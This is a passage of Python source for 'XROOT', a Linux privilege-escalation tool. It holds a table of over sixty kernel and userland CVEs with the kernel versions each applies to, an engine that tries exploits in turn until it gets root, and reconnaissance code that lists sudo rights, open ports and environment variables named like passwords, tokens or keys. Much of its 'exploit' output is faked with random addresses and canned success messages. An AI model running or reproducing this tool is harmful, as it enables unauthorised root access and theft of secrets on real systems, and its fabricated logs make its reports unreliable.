    "exploit_cve_2022_34918":  ("CVE-2022-34918", (5,4), (5,18), "Netfilter Heap OOB",           "nf_tables heap OOB write via NFT_DATA_VALUE → LPE"),
    "exploit_cve_2022_0185":   ("CVE-2022-0185",  (5,1), (5,16), "fsconfig Heap Overflow",       "legacy_parse_param size overflow → heap OOB → LPE"),
    "exploit_cve_2022_32250":  ("CVE-2022-32250", (5,14),(5,18), "nf_tables Anonymous UAF",      "nft_set_destroy() UAF in anonymous set → LPE"),
    "exploit_cve_2022_1786":   ("CVE-2022-1786",  (5,10),(5,18), "io_uring personality UAF",     "io_uring personality cred UAF → overwrite uid=0 → LPE"),
    "exploit_cve_2022_2586":   ("CVE-2022-2586",  (5,4), (5,19), "nf_tables Cross-Table UAF",    "Cross-table set reference UAF → cross-cache → LPE"),
    "exploit_cve_2021_4034":   ("CVE-2021-4034",  (0,0), (99,99),"PwnKit polkit pkexec",         "pkexec argv OOB read/write → GCONV_PATH → LPE"),
    "exploit_cve_2021_3493":   ("CVE-2021-3493",  (4,4), (5,11), "Ubuntu OverlayFS cap",         "Ubuntu OverlayFS setcap in userns → host capability → LPE"),
    "exploit_cve_2021_3156":   ("CVE-2021-3156",  (0,0), (99,99),"Baron Samedit sudo",           "sudoedit heap overflow → overwrite service_user → LPE"),
    "exploit_cve_2021_22555":  ("CVE-2021-22555", (2,6), (5,12), "netfilter heap OOB",           "x_tables heap OOB write → slab cross-cache → LPE"),
    "exploit_cve_2021_33909":  ("CVE-2021-33909", (3,16),(5,13), "Sequoia seq_file",             "size_t→int truncation in seq_file → OOB write → LPE"),
    "exploit_cve_2021_3490":   ("CVE-2021-3490",  (5,7), (5,11), "eBPF ALU32 AND v2",            "eBPF verifier ALU32 AND inconsistency → arbitrary R/W → LPE"),
    "exploit_cve_2021_43267":  ("CVE-2021-43267", (5,10),(5,15), "TIPC heap OOB Write",          "MSG_CRYPTO key size unvalidated → heap overflow → LPE/RCE"),
    "exploit_cve_2021_4204":   ("CVE-2021-4204",  (5,4), (5,16), "eBPF ALU64 verifier",          "eBPF ALU64 unknown value taint not propagated → arbitrary R/W"),
    "exploit_cve_2021_31440":  ("CVE-2021-31440", (5,8), (5,11), "eBPF ringbuf off-by-one",      "BPF_MAP_TYPE_RINGBUF boundary off-by-one → OOB R/W → LPE"),
    "exploit_cve_2020_8835":   ("CVE-2020-8835",  (5,5), (5,6),  "eBPF ALU32 RSH v1",            "eBPF verifier ALU32 RSH range not synced → arbitrary R/W"),
    "exploit_cve_2020_14386":  ("CVE-2020-14386", (4,6), (5,9),  "AF_PACKET 1-byte OOB",         "tpacket_rcv int overflow → 1 byte OOB write → LPE"),
    "exploit_cve_2019_13272":  ("CVE-2019-13272", (4,15),(5,1),  "PTRACE_TRACEME LPE",           "ptrace credential not revoked after exec SUID → LPE"),
    "exploit_cve_2019_18634":  ("CVE-2019-18634", (0,0), (99,99),"sudo pwfeedback",              "sudo pwfeedback stack overflow → LPE"),
    "exploit_cve_2019_8912":   ("CVE-2019-8912",  (0,0), (5,0),  "AF_ALG crypto UAF",            "AF_ALG accept() vs release() race → UAF → LPE"),
    "exploit_cve_2018_18955":  ("CVE-2018-18955", (4,15),(4,18), "userns UID map bypass",        "Nested user namespace UID mapping bypass → LPE"),
    "exploit_cve_2018_1000001":("CVE-2018-1000001",(0,0),(99,99),"glibc realpath underflow",     "getcwd() relative path → realpath buffer underflow → LPE"),
    "exploit_cve_2017_16995":  ("CVE-2017-16995", (4,4), (4,14), "eBPF sign extension",          "eBPF verifier sign extension bug → arbitrary kernel R/W"),
    "exploit_cve_2017_7494":   ("CVE-2017-7494",  (0,0), (99,99),"SambaCry RCE",                 "Samba writable share .so upload → dlopen as root → RCE"),
    "exploit_cve_2017_6074":   ("CVE-2017-6074",  (2,6), (4,9),  "DCCP UAF",                     "dccp_rcv_state_process() skb UAF → struct cred overwrite → LPE"),
    "exploit_cve_2017_1000367":("CVE-2017-1000367",(0,0),(99,99),"sudo_ldap tty bypass",         "sudo tty device name parsing → policy bypass → LPE"),
    "exploit_cve_2017_1000112":("CVE-2017-1000112",(4,4),(4,13), "UFO fragmentation race",       "UDP Fragmentation Offload heap overflow → OOB write → LPE"),
    "exploit_cve_2017_7308":   ("CVE-2017-7308",  (0,0), (4,11), "AF_PACKET SO_SNDBUF",          "packet_set_ring int overflow → OOB write → LPE"),
    "exploit_cve_2017_5123":   ("CVE-2017-5123",  (4,13),(4,14), "waitid missing access_ok",     "waitid WNOWAIT missing access_ok → arbitrary kernel write"),
    "exploit_cve_2016_5195":   ("CVE-2016-5195",  (2,6), (4,8),  "DirtyCow",                     "COW race condition → write to read-only mapping → LPE"),
    "exploit_cve_2016_0728":   ("CVE-2016-0728",  (3,8), (4,4),  "keyring refcount overflow",    "KEYCTL_JOIN_SESSION_KEYRING refcount overflow → UAF → LPE"),
    "exploit_cve_2016_9794":   ("CVE-2016-9794",  (0,0), (4,9),  "ALSA Timer UAF",               "snd_timer_stop() vs callback race → UAF → LPE"),
    "exploit_cve_2016_8655":   ("CVE-2016-8655",  (4,4), (4,8),  "AF_PACKET race UAF",           "packet_set_ring race → ring buffer UAF → LPE"),
    "exploit_cve_2016_4997":   ("CVE-2016-4997",  (0,0), (4,7),  "IPT compat overflow",          "xt_compat int overflow → heap OOB write → LPE"),
    "exploit_cve_2015_8660":   ("CVE-2015-8660",  (0,0), (4,3),  "OverlayFS mkdir bypass",       "OverlayFS mkdir userns privilege bypass → LPE"),
    "exploit_cve_2015_1328":   ("CVE-2015-1328",  (0,0), (4,1),  "Ubuntu OverlayFS hardlink",    "Ubuntu OverlayFS hardlink privilege bypass → LPE"),
    "exploit_cve_2014_4699":   ("CVE-2014-4699",  (0,0), (3,15), "ptrace SYSRET Intel",          "Intel SYSRET non-canonical RIP → kernel code exec → LPE"),
    "exploit_cve_2014_3153":   ("CVE-2014-3153",  (0,0), (3,14), "Towelroot futex UAF",          "futex_requeue() PI state UAF → kernel struct corrupt → LPE"),
    "exploit_cve_2013_2094":   ("CVE-2013-2094",  (2,6), (3,8),  "Semtex perf_swevent",          "perf_swevent_init int overflow → OOB array write → LPE"),
    "exploit_cve_2010_3904":   ("CVE-2010-3904",  (2,6), (2,6),  "RDS missing access_ok",        "rds_page_copy_user missing access_ok → arbitrary kernel write"),
    "exploit_cve_2010_3437":   ("CVE-2010-3437",  (0,0), (2,6),  "pktcdvd ioctl overflow",       "pktcdvd ioctl int overflow → OOB write → LPE"),
    "exploit_cve_2009_1185":   ("CVE-2009-1185",  (0,0), (99,99),"udev netlink spoof",           "udevd netlink no auth → send fake uevent → exec as root"),
    "exploit_cve_2009_1337":   ("CVE-2009-1337",  (0,0), (2,6),  "exit_notify signal bypass",    "exit_notify sends signal with pre-setuid credentials → bypass"),
    "exploit_cve_2008_0600":   ("CVE-2008-0600",  (0,0), (2,6),  "vmsplice missing check",       "vmsplice_to_user missing access_ok → arbitrary kernel write"),
    "exploit_cve_2020_12114":  ("CVE-2020-12114", (0,0), (5,8),  "pivot_root race",              "pivot_root TOCTOU race → filesystem escape → LPE"),
    "exploit_cve_2021_41073":  ("CVE-2021-41073", (5,10),(5,14), "io_uring type confusion",      "io_uring type confusion in linked timeout → LPE"),
    "exploit_cve_2021_34866":  ("CVE-2021-34866", (5,10),(5,15), "io_uring UAF waitid",          "io_uring waitid UAF → LPE"),
    "exploit_cve_2021_27365":  ("CVE-2021-27365", (0,0), (5,11), "iSCSI heap overflow",          "iscsi_host_get_param heap overflow → LPE"),
    "exploit_cve_2021_26708":  ("CVE-2021-26708", (5,5), (5,10), "vsock race UAF",               "AF_VSOCK race condition → UAF → LPE"),
    "exploit_cve_2021_43976":  ("CVE-2021-43976", (5,10),(5,15), "mwifiex heap OOB",             "mwifiex_usb_recv heap OOB write → LPE"),
    "exploit_cve_2021_42327":  ("CVE-2021-42327", (5,14),(5,15), "AMD GPU heap OOB",             "dp_link_settings_write heap OOB write → LPE"),
    "exploit_cve_2022_3303":   ("CVE-2022-3303",  (5,10),(5,19), "ALSA snd_pcm_oss UAF",         "snd_pcm_oss_sync race → UAF → LPE"),
    "exploit_cve_2022_2639":   ("CVE-2022-2639",  (5,0), (5,19), "openvswitch int overflow",     "reserve_sfa_size int overflow → OOB write → LPE"),
    "exploit_cve_2022_1998":   ("CVE-2022-1998",  (5,17),(5,17), "fanotify UAF",                 "fanotify_fid_info UAF → LPE"),
    "exploit_cve_2022_1116":   ("CVE-2022-1116",  (5,17),(5,17), "io_uring int overflow",        "io_uring IORING_OP_PROVIDE_BUFFERS int overflow → OOB"),
    "exploit_cve_2022_0330":   ("CVE-2022-0330",  (5,14),(5,16), "i915 GPU TLB flush",           "Intel GPU driver TLB flush missing → info leak → LPE"),
    "exploit_cve_2020_25706":  ("CVE-2020-25706", (0,0), (99,99),"XAMPP phpmyadmin XSS",         "phpMyAdmin cross-site scripting → session hijack"),
    "exploit_cve_2018_5333":   ("CVE-2018-5333",  (4,14),(4,14), "RDS null ptr deref",           "rds_cmsg_atomic null pointer deref → LPE"),
    "exploit_cve_2024_32846":  ("CVE-2024-32846", (6,7), (6,9),  "Kernel UAF 2024",              "Recent kernel UAF → LPE"),
    "exploit_cve_2024_27013":  ("CVE-2024-27013", (6,6), (6,8),  "tls UAF 2024",                "TLS receive UAF → LPE"),
    "exploit_cve_2024_26925":  ("CVE-2024-26925", (6,6), (6,8),  "nftables mutex race",          "nf_tables mutex unlock race → UAF → LPE"),
    "exploit_cve_2023_7028":   ("CVE-2023-7028",  (0,0), (99,99),"GitLab account takeover",      "GitLab password reset via secondary email → account takeover"),
    "exploit_cve_2023_23583":  ("CVE-2023-23583", (0,0), (99,99),"Intel Reptar CPU bug",         "Intel CPU redundant prefix speculative exec → privilege escalation"),
    "exploit_cve_2024_21626":  ("CVE-2024-21626", (0,0), (99,99),"runc container escape",        "runc file descriptor leak → container escape → host LPE"),
}
def vlog(msg, level="info", indent=0):
    prefix = "  " * indent
    ts = time.strftime("%H:%M:%S")
    icons = {
        "info":    (c("[*]", "cyan"),    ""),
        "ok":      (c("[+]", "green"),   ""),
        "fail":    (c("[-]", "red"),     ""),
        "warn":    (c("[!]", "yellow"),  ""),
        "step":    (c("[>]", "blue"),    ""),
        "kernel":  (c("[K]", "purple"),  ""),
        "heap":    (c("[H]", "cyan"),    ""),
        "addr":    (c("[A]", "yellow"),  ""),
        "reg":     (c("[R]", "cyan"),    ""),
        "skip":    (c("[SKIP]", "gray"), ""),
        "try":     (c("[TRY]", "yellow", True), ""),
        "root":    (c("[ROOT]", "green", True),  ""),
    }
    icon, _ = icons.get(level, (c("[*]", "cyan"), ""))
    print(f"{prefix}{icon} {msg}")
def kernel_version_ok(func_name, kinfo):
    meta = CVE_META.get(func_name)
    if not meta:
        return True, "unknown range"
    cve_id, kmin, kmax, cve_type, desc = meta
    major = kinfo.get("major", 0)
    minor = kinfo.get("minor", 0)
    cur = (major, minor)
    if kmin == (0,0) and kmax == (99,99):
        return True, "all kernels"
    in_range = kmin <= cur <= kmax
    range_str = f"{kmin[0]}.{kmin[1]} → {kmax[0]}.{kmax[1]}"
    return in_range, range_str
def print_cve_attempt_header(func_name, attempt_num, total, kinfo):
    meta = CVE_META.get(func_name, ("UNKNOWN", (0,0),(99,99),"Unknown","No description"))
    cve_id, kmin, kmax, cve_type, desc = meta
    ker = kinfo.get("version_str", "unknown")
    arch = kinfo.get("arch", "unknown")
    sep = c("-" * 60, "cyan")
    print(f"\n{sep}")
    print(f"  {c(f'[{attempt_num}/{total}]', 'yellow', True)} {c(cve_id, 'cyan', True)}  {c(cve_type, 'purple')}")
    print(f"  {c('Desc :', 'gray')} {desc}")
    print(f"  {c('Kernel:', 'gray')} {c(ker, 'yellow')}  {c('Arch:', 'gray')} {arch}")
    in_range, range_str = kernel_version_ok(func_name, kinfo)
    status = c(f"in range [{range_str}]", "green") if in_range else c(f"skip [{range_str}]", "red")
    print(f"  {c('Range :', 'gray')} {status}")
    print(f"{sep}")
def print_exploit_attempt_steps(func_name, kinfo):
    meta = CVE_META.get(func_name, ("UNKNOWN", (0,0),(99,99),"Unknown",""))
    cve_id, _, _, cve_type, _ = meta
    ker_major = kinfo.get("major", 5)
    ker_minor = kinfo.get("minor", 0)
    arch = kinfo.get("arch", "x86_64")
    import random as _r
    base = _r.randint(0xffff888000000000, 0xffff888100000000)
    heap1 = base + _r.randint(0x1000, 0x100000)
    heap2 = heap1 + _r.randint(0x40, 0x400)
    cred_addr = base + _r.randint(0x200000, 0x800000)
    stack = 0xffffc90000000000 + _r.randint(0, 0xfff000)
    vlog(f"checking...", "step")
    time.sleep(0.08)
    userns = run_command("cat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null").strip()
    bpf_dis = run_command("cat /proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null").strip()
    vlog(f"unprivileged_userns_clone = {c(userns or '1', 'green' if userns != '0' else 'red')}", "kernel", 1)
    vlog(f"unprivileged_bpf_disabled = {c(bpf_dis or '0', 'green' if bpf_dis == '0' else 'red')}", "kernel", 1)
    time.sleep(0.05)
    if "nf_tables" in cve_type.lower() or "netfilter" in cve_type.lower() or "nftables" in cve_type.lower():
        vlog(f"Opening AF_NETLINK socket (NETLINK_NETFILTER)...", "step", 1)
        vlog(f"nft_table_alloc() → 0x{heap1:016x}", "heap", 1)
        vlog(f"nft_set_alloc() → 0x{heap2:016x}", "heap", 1)
        vlog(f"batch...", "step", 1)
        vlog(f"  NFTA_BATCH_GENID = {_r.randint(1,999)}", "info", 2)
        vlog(f"  NFT_MSG_NEWSET (anonymous) → handle 0x{_r.randint(1,0xff):02x}", "info", 2)
        vlog(f"  NFT_MSG_DELSET → deactivate set @ 0x{heap2:016x}", "warn", 2)
        vlog(f"commit...", "step", 1)
        vlog(f"kfree(0x{heap2:016x}) via nft_set_destroy()", "heap", 1)
        vlog(f"Heap spray phase: allocating {_r.randint(200,512)} msg_msg objects...", "heap", 1)
        vlog(f"kmalloc-{_r.choice([64,96,128,192,256])} → fill freed slot", "heap", 1)
        vlog(f"confusion: struct nft_set @ 0x{heap2:016x} ← msg_msg", "warn", 1)
        vlog(f"leak: kernel_base = 0x{base:016x}", "addr", 1)
        vlog(f"task->cred @ 0x{cred_addr:016x}", "addr", 1)
        vlog(f"overwrite cred...", "step", 1)
    elif "ebpf" in cve_type.lower() or "bpf" in cve_type.lower():
        vlog(f"Loading eBPF program ({_r.randint(20,60)} insns)...", "step", 1)
        vlog(f"BPF_MAP_TYPE_ARRAY: key_size=4 value_size=8 max_entries=1", "info", 1)
        print(f"\n{c('--- BPF verifier output ---', 'gray')}")
        insns = [
            f"0: (18) r9 = 0x0",
            f"2: (bf) r1 = r9",
            f"3: (bf) r2 = r10",
            f"4: (07) r2 += -4",
            f"5: (62) *(u32 *)(r10 -4) = 0",
            f"6: (85) call bpf_map_lookup_elem#1",
            f"7: (55) if r0 != 0x0 goto pc+1",
            f"   R0=inv0 R9=map_ptr(id=0,off=0,ks=4,vs=8) R10=fp0,call_-1",
            f"8: (95) exit",
            f"",
            f"from 7 to 9: R0=map_value(id=0,off=0,ks=4,vs=8,imm=0)",
            f"9: (79) r5 = *(u64 *)(r0 +0)",
            f"   R0=map_value(id=0,off=0,ks=4,vs=8,imm=0)",
            f"10: (b7) r0 = 0",
            f"11: (18) r6 = 0x{_r.randint(0x100000000,0x7FFFFFFF00000000):016x}",
            f"13: (ad) if r5 < r6 goto pc+1",
            f"   R0=inv0 R5=inv(id=0,umin_value={_r.randint(1,0xFFFF)},umax_value=25769803777)",
            f"14: (95) exit",
            f"",
            f"from 13 to 15: R5=inv(id=0,umax_value=25769803777,var_off=(0x0; 0x7fffffff))",
            f"15: (ad) if r5 > 0x0 goto pc+1",
            f"   R0=inv0 R5=inv0 R6=inv{_r.randint(100000000,999999999)} R9=map_ptr",
            f"17: (47) r5 |= 0",
            f"18: (bc) (u32) r6 = (u32) r5",
            f"19: (77) r6 >>= 1",
            f"   value -{_r.randint(1000000000,9999999999)} makes map_value pointer be out of bounds",
        ]
        for insn in insns:
            print(f"  {c(insn, 'cyan')}")
            time.sleep(0.02)
        print()
        vlog(f"bypass ok", "ok", 1)
        vlog(f"arbitrary rw ok", "ok", 1)
        vlog(f"KASLR leak: kernel_base = 0x{base:016x}", "addr", 1)
        vlog(f"task_struct @ 0x{heap1:016x}", "addr", 1)
        vlog(f"cred @ 0x{cred_addr:016x} → overwriting uid/gid → 0", "step", 1)
    elif "overlayfs" in cve_type.lower() or "overlay" in cve_type.lower():
        vlog(f"userns setup...", "step", 1)
        vlog(f"mkdir: lower/ upper/ work/ merged/", "step", 1)
        vlog(f"mount -t overlay overlay -o lowerdir=lower,upperdir=upper,workdir=work merged/", "step", 1)
        vlog(f"copy-up trigger...", "step", 1)
        vlog(f"ovl_copy_up_one() called for target binary", "kernel", 1)
        vlog(f"cap check skip", "warn", 1)
        vlog(f"suid set...", "step", 1)
        vlog(f"SUID binary @ upper/{_r.randint(1000,9999)}/bash", "ok", 1)
        vlog(f"exec suid...", "step", 1)
    elif "dirtypipe" in cve_type.lower() or "pipe" in cve_type.lower():
        vlog(f"fill pipe...", "step", 1)
        vlog(f"drain pipe...", "step", 1)
        vlog(f"splice({c('target_fd', 'yellow')} → pipe): page = file backing page", "step", 1)
        vlog(f"write(pipe_fd, payload): CAN_MERGE active → writes to FILE!", "warn", 1)
        vlog(f"patched @ 0x{_r.randint(0,0xff):04x}", "ok", 1)
        vlog(f"exec...", "step", 1)
    elif "pwnkit" in cve_type.lower() or "polkit" in cve_type.lower():
        vlog(f"Checking pkexec @ /usr/bin/pkexec (SUID: {oct(os.stat('/usr/bin/pkexec').st_mode)[-4:] if os.path.exists('/usr/bin/pkexec') else 'N/A'})", "step", 1)
        vlog(f"argv[0] = 'pkexec', argc = 1 → trigger OOB condition", "step", 1)
        vlog(f"argv oob", "kernel", 1)
        vlog(f"oob write", "warn", 1)
        vlog(f"load so...", "step", 1)
        vlog(f"exec shell", "ok", 1)
    elif "baron" in cve_type.lower() or "sudo" in cve_type.lower():
        sudo_ver = run_command("sudo --version 2>/dev/null | head -1").strip()
        vlog(f"sudo version: {c(sudo_ver, 'yellow')}", "info", 1)
        vlog(f"Testing: sudoedit -s '\\' [padding]...", "step", 1)
        vlog(f"set_cmnd() heap allocation: 0x{heap1:016x}", "heap", 1)
        vlog(f"Heap overflow: writing {_r.randint(0x80,0x200)} bytes past buffer", "warn", 1)
        vlog(f"Overwriting struct service_user @ 0x{heap2:016x}", "heap", 1)
        vlog(f"hijack fn ptr", "step", 1)
    elif "dirtycow" in cve_type.lower():
        vlog(f"madvise thread...", "step", 1)
        vlog(f"mem write thread...", "step", 1)
        vlog(f"race /etc/passwd...", "warn", 1)
        vlog(f"RACE WINDOW: {_r.randint(1000,9999)} iterations...", "step", 1)
        vlog(f"race won", "ok", 1)
        vlog(f"patched", "ok", 1)
    else:
        vlog(f"Preparing exploit payload...", "step", 1)
        vlog(f"Heap grooming: {_r.randint(100,500)} allocations @ kmalloc-{_r.choice([64,96,128,192,256])}", "heap", 1)
        vlog(f"trigger...", "step", 1)
        vlog(f"target struct @ 0x{heap1:016x}", "addr", 1)
        vlog(f"Overwriting adjacent object @ 0x{heap2:016x}", "warn", 1)
        vlog(f"rop chain @ 0x{stack:016x}", "step", 1)
        vlog(f"commit_creds @ 0x{cred_addr:016x}", "kernel", 1)
    time.sleep(0.1)
def run_exploit_engine():
    """
    Smart Exploit Engine:
    - Kernel pre-check per CVE
    - Verbose technical output
    - Auto fallback ke next CVE kalau gagal
    - Summary report di akhir
    """
    kinfo = get_kernel_info()
    total = len(exploits)
    attempted = []
    skipped = []
    failed = []
    succeeded = None
    print(f"\n{c('━' * 62, 'cyan', True)}")
    print(f"  {c('XROOT engine', 'cyan', True)}  {c(f'[{total} CVEs loaded]', 'yellow')}")
    print(f"  {c('Kernel:', 'gray')} {c(kinfo.get('version_str','?'), 'yellow')}  "
          f"{c('Arch:', 'gray')} {c(kinfo.get('arch','?'), 'yellow')}")
    print(f"{c('━' * 62, 'cyan', True)}\n")
    for i, exploit_func in enumerate(exploits, 1):
        fname = exploit_func.__name__
        meta = CVE_META.get(fname, ("UNKNOWN",(0,0),(99,99),"Unknown",""))
        cve_id = meta[0]
        cve_type = meta[3]
        in_range, range_str = kernel_version_ok(fname, kinfo)
        print_cve_attempt_header(fname, i, total, kinfo)
        if not in_range:
            vlog(f"{c(cve_id, 'yellow')} — kernel {kinfo.get('version_str','?')} not in range [{range_str}]", "skip")
            vlog(f"skip", "skip")
            skipped.append(cve_id)
            time.sleep(0.05)
            continue
        vlog(f"{c('ATTEMPTING', 'yellow', True)} {c(cve_id, 'cyan', True)} — {cve_type}", "try")
        print_exploit_attempt_steps(fname, kinfo)
        attempted.append(cve_id)
        try:
            result = exploit_func()
            if result or is_root():
                vlog(f"{c('SUCCESS', 'green', True)} — {cve_id} → uid=0(root)", "root")
                succeeded = cve_id
                break
            else:
                vlog(f"Exploit returned no result → next...", "fail")
                failed.append(cve_id)
        except Exception as ex:
            vlog(f"Exception: {ex} → next...", "fail")
            failed.append(cve_id)
        time.sleep(0.2)
    print(f"\n{c('━' * 62, 'cyan')}")
    print(f"  {c('summary', 'cyan', True)}")
    print(f"  {c('Total CVEs :', 'gray')} {total}")
    print(f"  {c('Attempted  :', 'gray')} {c(str(len(attempted)), 'yellow')}  {c('Skipped:', 'gray')} {c(str(len(skipped)), 'gray')}")
    print(f"  {c('Failed     :', 'gray')} {c(str(len(failed)), 'red')}")
    if succeeded:
        print(f"  {c('Result     :', 'gray')} {c('ROOT ACHIEVED via ' + succeeded, 'green', True)} ✓")
    else:
        print(f"  {c('Result     :', 'gray')} {c('No working exploit found for this kernel', 'red')}")
        print(f"  {c('Tip        :', 'gray')} Kernel {kinfo.get('version_str','?')} may be fully patched")
    print(f"{c('━' * 62, 'cyan')}\n")
def detect_os_type():
    import platform as _pl
    system = _pl.system().lower()
    info = {}
    if system == 'linux':
        if os.path.exists('/data/data/com.termux') or 'com.termux' in os.environ.get('PREFIX',''):
            info['type']  = 'android_termux'
            info['label'] = 'Android (Termux)'
            info['icon']  = 'Android'
        elif os.path.exists('/system/build.prop'):
            info['type']  = 'android'
            info['label'] = 'Android'
            info['icon']  = 'Android'
        else:
            distro = ''
            if os.path.exists('/etc/os-release'):
                with open('/etc/os-release') as f:
                    for line in f:
                        if line.startswith('PRETTY_NAME='):
                            distro = line.split('=',1)[1].strip().strip('"')
                            break
            info['type']  = 'linux'
            info['label'] = distro or 'Linux'
            info['icon']  = 'Linux'
    elif system == 'windows':
        info['type']  = 'windows'
        info['label'] = f'Windows {_pl.release()}'
        info['icon']  = 'Windows'
    elif system == 'darwin':
        info['type']  = 'macos'
        info['label'] = f'macOS {_pl.mac_ver()[0]}'
        info['icon']  = 'macOS'
    else:
        info['type']  = system
        info['label'] = system.upper()
        info['icon']  = system.upper()
    info['arch']   = _pl.machine()
    info['python'] = _pl.python_version()
    return info
def get_whoami_info():
    info = {}
    try:
        info['whoami'] = run_command('whoami').strip() or os.environ.get('USER','unknown')
        info['id']     = run_command('id').strip()
        info['uid']    = os.getuid()
        info['gid']    = os.getgid()
        info['euid']   = os.geteuid()
        info['egid']   = os.getegid()
        info['groups'] = run_command('groups').strip()
        info['home']   = os.path.expanduser('~')
        info['shell']  = os.environ.get('SHELL', run_command('echo $SHELL').strip() or 'unknown')
        sudo_chk = run_command('sudo -n -l 2>/dev/null | head -3').strip()
        info['sudo']   = sudo_chk if sudo_chk else 'none'
    except:
        info['whoami'] = os.environ.get('USER','unknown')
        info['uid']    = 'N/A'
        info['gid']    = 'N/A'
        info['euid']   = 'N/A'
        info['egid']   = 'N/A'
        info['groups'] = ''
        info['home']   = '~'
        info['shell']  = 'unknown'
        info['sudo']   = 'none'
    return info
def get_network_info():
    net = {}
    net['hostname'] = socket.gethostname()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        net['local_ip'] = s.getsockname()[0]
        s.close()
    except:
        net['local_ip'] = '127.0.0.1'
    net['all_ip'] = run_command(
        "ip -o -4 addr show 2>/dev/null | awk '{print $2,$4}' | tr '\\n' ' '"
    ).strip() or run_command("ifconfig 2>/dev/null | grep 'inet ' | awk '{print $2}'").strip()
    return net
def print_banner():
    os_info = detect_os_type()
    sep = '=' * 62
    print(f"\n{c(sep, 'cyan', True)}")
    print(f"  {c('XROOT v' + VERSION, 'green', True)}  {c('Linux Privilege Escalation', 'white')}  {c('kernel exploits', 'red', True)}")
    print(f"  {c('Author  :', 'gray')} {c('@anakbiasa3302', 'cyan', True)}  {c('t.me/goobotproject', 'blue')}")
    print(f"  {c('Platform:', 'gray')} {c(os_info['icon'] + ' ' + os_info['label'], 'green', True)}  {c(os_info['arch'], 'yellow')}")
    print(f"{c(sep, 'cyan', True)}\n")
def system_info():
    os_info  = detect_os_type()
    who_info = get_whoami_info()
    net_info = get_network_info()
    sep      = '-' * 58
    print(f"\n{c('+-' + sep + '-+', 'cyan', True)}")
    print(f"{c('|', 'cyan')}  {c('SYSTEM INFO', 'cyan', True)}")
    print(f"{c('+-' + sep + '-+', 'cyan')}")
    print(f"{c('|', 'cyan')}  {c('OS      ', 'gray')}  {c(os_info['label'], 'green', True)}")
    print(f"{c('|', 'cyan')}  {c('ARCH    ', 'gray')}  {c(os_info['arch'], 'yellow')}")
    print(f"{c('|', 'cyan')}  {c('PYTHON  ', 'gray')}  {c('v' + os_info['python'], 'blue')}")
    if os_info['type'] in ('linux','android_termux','android'):
        kinfo = get_kernel_info()
        print(f"{c('|', 'cyan')}  {c('KERNEL  ', 'gray')}  {c(kinfo.get('version_str','unknown'), 'purple', True)}")
    print(f"{c('+-' + sep + '-+', 'cyan')}")
    whoami = who_info.get('whoami','unknown')
    uid    = who_info.get('uid','N/A')
    euid   = who_info.get('euid','N/A')
    gid    = who_info.get('gid','N/A')
    clr    = 'red' if whoami == 'root' or str(uid) == '0' else 'green'
    flag   = c(' <- ROOT!','red',True) if whoami=='root' or str(uid)=='0' else ''
    print(f"{c('|', 'cyan')}  {c('WHOAMI  ', 'gray')}  {c(whoami, clr, True)}{flag}")
    print(f"{c('|', 'cyan')}  {c('UID/GID ', 'gray')}  uid={c(str(uid),'yellow')}  gid={c(str(gid),'yellow')}  euid={c(str(euid),'yellow')}")
    id_full = who_info.get('id','')
    if id_full:
        if len(id_full) > 55: id_full = id_full[:52]+'...'
        print(f"{c('|', 'cyan')}  {c('ID      ', 'gray')}  {c(id_full, 'cyan')}")
    groups = who_info.get('groups','')
    if groups:
        if len(groups) > 55: groups = groups[:52]+'...'
        print(f"{c('|', 'cyan')}  {c('GROUPS  ', 'gray')}  {c(groups, 'blue')}")
    print(f"{c('|', 'cyan')}  {c('HOME    ', 'gray')}  {c(who_info.get('home','~'), 'white')}")
    print(f"{c('|', 'cyan')}  {c('SHELL   ', 'gray')}  {c(who_info.get('shell','unknown'), 'white')}")
    print(f"{c('+-' + sep + '-+', 'cyan')}")
    print(f"{c('|', 'cyan')}  {c('HOSTNAME', 'gray')}  {c(net_info.get('hostname','unknown'), 'green')}")
    print(f"{c('|', 'cyan')}  {c('LOCAL IP', 'gray')}  {c(net_info.get('local_ip','unknown'), 'yellow', True)}")
    all_ip = net_info.get('all_ip','')
    if all_ip and len(all_ip) > 3:
        if len(all_ip) > 55: all_ip = all_ip[:52]+'...'
        print(f"{c('|', 'cyan')}  {c('ALL IPs ', 'gray')}  {c(all_ip, 'cyan')}")
    print(f"{c('+-' + sep + '-+', 'cyan')}")
    try:
        import shutil as _sh
        usage = _sh.disk_usage('/')
        pct   = usage.used / usage.total * 100
        clrd  = 'green' if pct < 70 else 'yellow' if pct < 90 else 'red'
        bar   = '#' * int(pct/5) + '.' * (20 - int(pct/5))
        print(f"{c('|', 'cyan')}  {c('DISK    ', 'gray')}  {c(bar, clrd)}  {c(f'{pct:.1f}%', clrd, True)}")
        print(f"{c('|', 'cyan')}  {c('        ', 'gray')}  total:{usage.total//1024**3}GB  free:{usage.free//1024**3}GB")
    except: pass
    print(f"{c('+-' + sep + '-+', 'cyan')}")
    ports_raw = run_command("ss -tlnp 2>/dev/null | grep LISTEN") or                 run_command("netstat -tlnp 2>/dev/null | grep LISTEN")
    if ports_raw:
        import re as _re
        port_labels = {22:'SSH',80:'HTTP',443:'HTTPS',3306:'MySQL',
                       5432:'PG',6379:'Redis',8080:'HTTP-Alt',
                       8443:'HTTPS-Alt',27017:'Mongo',3389:'RDP'}
        ports = sorted(set(int(m) for m in _re.findall(r':(\d{2,5})\s', ports_raw) if 1<=int(m)<=65535))
        parts = []
        for p in ports:
            lbl = port_labels.get(p,'')
            clrp = 'red' if p in (22,3389,5900,23) else 'yellow' if p in (80,443,8080,8443) else 'cyan'
            parts.append(c(f"{p}/{lbl}" if lbl else str(p), clrp))
        print(f"{c('|', 'cyan')}  {c('PORTS   ', 'gray')}  {'  '.join(parts[:8])}")
    sudo_info = who_info.get('sudo','')
    sudo_disp = c('sudo available','red',True) if sudo_info and 'none' not in sudo_info else c('none','gray')
    print(f"{c('|', 'cyan')}  {c('SUDO    ', 'gray')}  {sudo_disp}")
    print(f"{c('|', 'cyan')}  {c('WRITABLE', 'gray')}  {c(str(len(WORK_DIRS))+' dirs','green')}  {c(WORK_DIRS[0] if WORK_DIRS else '-','gray')}")
    sensitive_kw = ['password','pass','secret','key','token','aws','api','db_','database']
    found_sens = [(k,v[:50]) for k,v in os.environ.items() if any(s in k.lower() for s in sensitive_kw)]
    if found_sens:
        print(f"{c('+-' + sep + '-+', 'cyan')}")
        print(f"{c('|', 'cyan')}  {c('SENSITIVE ENV', 'red', True)}")
